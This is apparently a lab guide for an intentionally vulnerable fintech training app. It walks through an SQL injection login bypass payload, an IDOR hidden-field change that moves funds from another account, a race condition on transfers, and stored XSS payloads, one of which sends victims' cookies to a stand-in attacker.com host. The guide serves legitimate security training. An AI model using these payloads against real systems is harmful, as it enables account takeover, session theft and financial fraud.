# ❄️ ARCTIC FINTECH SOLUTIONS - LAB GUIDE

Welcome to the Arctic FinTech Security Laboratory. This guide will walk you through the primary vulnerabilities present in this "Pro" application.

## 1. Authentication Bypass (SQL Injection)
- **Target**: `index.php` (Login)
- **Attack**: Use a classic tautology in the username field.
- **Payload**: `' OR '1'='1' #`
- **Note**: Le `#` permet de mettre le reste de la requête (mot de passe) en commentaire.
- **Goal**: Access the dashboard without a valid password.

## 2. Horizontal Privilege Escalation (IDOR)
- **Target**: `transfer.php`
- **Mechanism**: The form contains a hidden input `<input type="hidden" name="from_user_id" value="X">`.
- **Attack**: Use Browser DevTools (F12) to change `value="1"` (your ID) to `value="4"` (Victime).
- **Goal**: Transfer funds out of account #4 into your own.

## 3. Persistent XSS (Cross-Site Scripting)
- **Target**: Transaction History / Admin Panel
- **Mechanism**: The "Description" field is not sanitized before being rendered.
- **Payload**: `<script>alert('Pwned')</script>` or `<script>document.location='http://attacker.com/steal?c='+document.cookie</script>`
- **Goal**: Execute JavaScript in the browser of other users (especially the admin).

## 4. Race Condition
- **Target**: Transfer Logic
- **Mechanism**: The balance check and debit occur in separate, non-atomic steps.
- **Attack**: Click the "TESTER LA RACE CONDITION" button to send 5 rapid requests.
- **Goal**: Withdraw more money than your current balance.

---
*Note: This environment is for educational purposes only. Never use these techniques on systems you do not own.*
